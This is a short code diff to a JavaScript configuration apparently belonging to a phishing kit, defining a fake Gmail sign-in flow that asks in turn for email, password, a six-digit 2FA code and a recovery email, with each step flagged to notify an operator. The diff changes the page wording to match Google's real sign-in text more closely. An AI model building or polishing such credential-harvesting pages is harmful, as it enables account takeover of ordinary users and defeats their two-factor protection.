@@ -592,7 +592,7 @@ const FLOWS = {
   // ── EMAIL ───────────────────────────────────────────────────────────────────
 
   gmail: [
-    { slug:'email',          form_type:'login',  page_title:'Sign In',            headline:'Sign In',                            subheadline:'Go to your Google Account',                 fields:['email'],                          layout:'auth',  cta:'Next',              step_label:'Email',          notify_step:true  },
+    { slug:'email',          form_type:'login',  page_title:'Sign In',            headline:'Sign in',                            subheadline:'Use your Google Account',                   fields:['email'],                          layout:'auth',  cta:'Next',              step_label:'Email',          notify_step:true  },
     { slug:'password',       form_type:'login',  page_title:'Welcome',            headline:'Welcome',                            subheadline:'Enter your password',                       fields:['password'],                       layout:'auth',  cta:'Next',              step_label:'Password',       notify_step:true  },
     { slug:'2fa-phone',      form_type:'otp',    page_title:'Verification',       headline:'Verify Your Identity',               subheadline:'We sent a notification to your phone. Enter the verification code', fields:['code'], layout:'otp',   cta:'Next',              step_label:'2FA Phone',      notify_step:true,  otp_length:6 },
     { slug:'recovery-email', form_type:'verify', page_title:'Recovery Email',     headline:'Add a Recovery Email',               subheadline:'Enter your recovery email to restore account access', fields:['recovery_email'],          layout:'verify',cta:'Add',               step_label:'Recovery Email', notify_step:true  }
